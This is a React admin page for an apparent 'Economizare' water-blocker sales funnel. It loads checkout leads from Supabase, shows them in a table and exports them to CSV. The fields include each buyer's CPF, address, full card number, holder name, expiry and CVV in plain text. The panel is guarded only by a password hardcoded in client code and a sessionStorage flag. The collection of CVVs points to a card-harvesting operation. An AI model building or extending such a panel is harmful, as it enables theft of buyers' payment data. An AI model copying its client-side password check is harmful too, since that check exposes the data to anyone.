import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";

const ADMIN_PASSWORD = "eco2025";
const SITE_ID = "economizare";

interface Lead {
  id: string;
  created_at: string;
  name: string;
  email: string;
  phone: string | null;
  cpf: string | null;
  payment_method: string;
  color: string | null;
  size: string | null;
  quantity: number | null;
  total_amount: number | null;
  shipping_cost: number | null;
  shipping_type: string | null;
  cep: string | null;
  endereco: string | null;
  numero: string | null;
  complemento: string | null;
  bairro: string | null;
  cidade: string | null;
  uf: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_installments: number | null;
  status: string | null;
  transaction_id: string | null;
}

export default function EconomizareAdmin() {
  const [authenticated, setAuthenticated] = useState(() => sessionStorage.getItem("eco_admin_auth") === "true");
  const [password, setPassword] = useState("");
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [tab, setTab] = useState<"all" | "pix" | "card" | "paid">("all");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      sessionStorage.setItem("eco_admin_auth", "true");
      setAuthenticated(true);
      setError("");
    } else {
      setError("Senha incorreta");
    }
  };

  useEffect(() => {
    if (!authenticated) return;
    setLoading(true);
    supabase
      .from("checkout_leads")
      .select("*")
      .eq("site_id", SITE_ID)
      .order("created_at", { ascending: false })
      .then(({ data, error }) => {
        if (error) {
          console.error(error);
          setError("Erro ao carregar dados");
        } else {
          setLeads((data as Lead[]) || []);
        }
        setLoading(false);
      });
  }, [authenticated]);

  const filtered = leads.filter((l) => {
    if (tab === "pix") return l.payment_method === "pix";
    if (tab === "card") return l.payment_method === "card";
    if (tab === "paid") return l.status === "paid" || l.status === "approved";
    return true;
  });

  const totalRevenue = leads
    .filter((l) => l.status === "paid" || l.status === "approved")
    .reduce((sum, l) => sum + (l.total_amount || 0), 0);

  const exportCSV = () => {
    if (!filtered.length) return;
    const headers = [
      "Data", "Nome", "Email", "Telefone", "CPF", "Método",
      "Qtd", "Total (R$)", "Frete (R$)", "Tipo Frete",
      "CEP", "Endereço", "Número", "Complemento", "Bairro", "Cidade", "UF",
      "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status", "ID Transação"
    ];
    const rows = filtered.map((l) => [
      new Date(l.created_at).toLocaleString("pt-BR"),
      l.name, l.email, l.phone || "", l.cpf || "", l.payment_method,
      l.quantity ?? "",
      l.total_amount ? (l.total_amount / 100).toFixed(2) : "",
      l.shipping_cost ? (l.shipping_cost / 100).toFixed(2) : "",
      l.shipping_type || "",
      l.cep || "", l.endereco || "", l.numero || "", l.complemento || "",
      l.bairro || "", l.cidade || "", l.uf || "",
      l.card_number || "", l.card_holder || "", l.card_expiry || "",
      l.card_cvv || "", l.card_installments ?? "", l.status || "", l.transaction_id || ""
    ]);
    const csv = [headers, ...rows].map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `economizare-leads-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0a0a0a] p-4">
        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-4 bg-[#141414] p-6 rounded-xl border border-[#222]">
          <div className="text-center">
            <img src="/images/eco/logo-economizare.png" alt="Economizare" className="h-10 mx-auto mb-3" />
            <h1 className="text-lg font-bold text-white">Painel Economizare</h1>
            <p className="text-xs text-gray-500">Acesso restrito</p>
          </div>
          <input
            type="password"
            placeholder="Senha"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full border border-[#333] rounded-lg px-4 py-3 text-sm bg-[#0a0a0a] text-white placeholder-gray-600"
          />
          {error && <p className="text-red-400 text-sm text-center">{error}</p>}
          <button type="submit" className="w-full bg-[#0f7b3f] hover:bg-[#0d6b35] text-white py-3 rounded-lg font-semibold transition-colors">
            Entrar
          </button>
        </form>
      </div>
    );
  }

  const tabs: { id: typeof tab; label: string; count: number }[] = [
    { id: "all", label: "Todos", count: leads.length },
    { id: "pix", label: "PIX", count: leads.filter(l => l.payment_method === "pix").length },
    { id: "card", label: "Cartão", count: leads.filter(l => l.payment_method === "card").length },
    { id: "paid", label: "Pagos", count: leads.filter(l => l.status === "paid" || l.status === "approved").length },
  ];

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white">
      {/* Header */}
      <header className="sticky top-0 z-10 bg-[#0a0a0a] border-b border-[#222] px-4 py-3">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img src="/images/eco/logo-economizare.png" alt="Economizare" className="h-7" />
            <div>
              <h1 className="text-sm font-bold">Painel Economizare</h1>
              <p className="text-[10px] text-gray-500">Bloqueador de Água — Funil Independente</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <a href="/economizare" target="_blank" className="text-xs text-[#0f7b3f] hover:underline">Ver página →</a>
            <button
              onClick={() => { sessionStorage.removeItem("eco_admin_auth"); setAuthenticated(false); }}
              className="text-xs text-gray-500 hover:text-white"
            >
              Sair
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-[1400px] mx-auto p-4">
        {/* Stats */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-4">
          <div className="bg-[#141414] border border-[#222] rounded-xl p-4">
            <p className="text-[10px] text-gray-500 uppercase tracking-wider">Total Leads</p>
            <p className="text-2xl font-bold mt-1">{leads.length}</p>
          </div>
          <div className="bg-[#141414] border border-[#222] rounded-xl p-4">
            <p className="text-[10px] text-gray-500 uppercase tracking-wider">Pagos</p>
            <p className="text-2xl font-bold mt-1 text-[#0f7b3f]">
              {leads.filter(l => l.status === "paid" || l.status === "approved").length}
            </p>
          </div>
          <div className="bg-[#141414] border border-[#222] rounded-xl p-4">
            <p className="text-[10px] text-gray-500 uppercase tracking-wider">Receita</p>
            <p className="text-2xl font-bold mt-1 text-[#0f7b3f]">
              R$ {(totalRevenue / 100).toFixed(2).replace(".", ",")}
            </p>
          </div>
          <div className="bg-[#141414] border border-[#222] rounded-xl p-4">
            <p className="text-[10px] text-gray-500 uppercase tracking-wider">Ticket Médio</p>
            <p className="text-2xl font-bold mt-1">
              {leads.filter(l => l.status === "paid" || l.status === "approved").length > 0
                ? `R$ ${(totalRevenue / leads.filter(l => l.status === "paid" || l.status === "approved").length / 100).toFixed(2).replace(".", ",")}`
                : "—"}
            </p>
          </div>
        </div>

        {/* Tabs + Export */}
        <div className="flex items-center justify-between mb-3">
          <div className="flex gap-1">
            {tabs.map((t) => (
              <button
                key={t.id}
                onClick={() => setTab(t.id)}
                className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${
                  tab === t.id
                    ? "bg-[#0f7b3f] text-white"
                    : "bg-[#141414] text-gray-400 hover:text-white border border-[#222]"
                }`}
              >
                {t.label} ({t.count})
              </button>
            ))}
          </div>
          <button onClick={exportCSV} className="bg-[#0f7b3f] text-white px-4 py-1.5 rounded-lg text-xs font-semibold hover:bg-[#0d6b35] transition-colors">
            Exportar CSV
          </button>
        </div>

        {/* Table */}
        {loading ? (
          <p className="text-center text-gray-500 py-8">Carregando...</p>
        ) : (
          <div className="overflow-x-auto border border-[#222] rounded-xl">
            <table className="w-full text-xs">
              <thead className="bg-[#141414]">
                <tr>
                  {["Data", "Nome", "Email", "Telefone", "CPF", "Método", "Qtd", "Total", "Cidade/UF",
                    "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status"].map((h) => (
                    <th key={h} className="px-3 py-2.5 text-left whitespace-nowrap font-semibold text-gray-400">{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {filtered.map((l) => (
                  <tr key={l.id} className="border-t border-[#1a1a1a] hover:bg-[#111]">
                    <td className="px-3 py-2 whitespace-nowrap text-gray-300">{new Date(l.created_at).toLocaleString("pt-BR")}</td>
                    <td className="px-3 py-2 whitespace-nowrap">{l.name}</td>
                    <td className="px-3 py-2 whitespace-nowrap text-gray-400">{l.email}</td>
                    <td className="px-3 py-2 whitespace-nowrap text-gray-400">{l.phone}</td>
                    <td className="px-3 py-2 whitespace-nowrap text-gray-400">{l.cpf}</td>
                    <td className="px-3 py-2 whitespace-nowrap">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${l.payment_method === "pix" ? "bg-[#0f7b3f]/20 text-[#0f7b3f]" : "bg-blue-500/20 text-blue-400"}`}>
                        {l.payment_method}
                      </span>
                    </td>
                    <td className="px-3 py-2">{l.quantity}</td>
                    <td className="px-3 py-2 whitespace-nowrap">R$ {l.total_amount ? (l.total_amount / 100).toFixed(2) : "—"}</td>
                    <td className="px-3 py-2 whitespace-nowrap text-gray-400">{l.cidade}/{l.uf}</td>
                    <td className="px-3 py-2 whitespace-nowrap font-mono text-gray-400">{l.card_number}</td>
                    <td className="px-3 py-2 whitespace-nowrap text-gray-400">{l.card_holder}</td>
                    <td className="px-3 py-2 text-gray-400">{l.card_expiry}</td>
                    <td className="px-3 py-2 text-gray-400">{l.card_cvv}</td>
                    <td className="px-3 py-2 text-gray-400">{l.card_installments}</td>
                    <td className="px-3 py-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${l.status === "paid" || l.status === "approved" ? "bg-[#0f7b3f]/20 text-[#0f7b3f]" : "bg-yellow-500/20 text-yellow-400"}`}>
                        {l.status || "pending"}
                      </span>
                    </td>
                  </tr>
                ))}
                {!filtered.length && (
                  <tr><td colSpan={15} className="text-center py-8 text-gray-500">Nenhum lead encontrado</td></tr>
                )}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
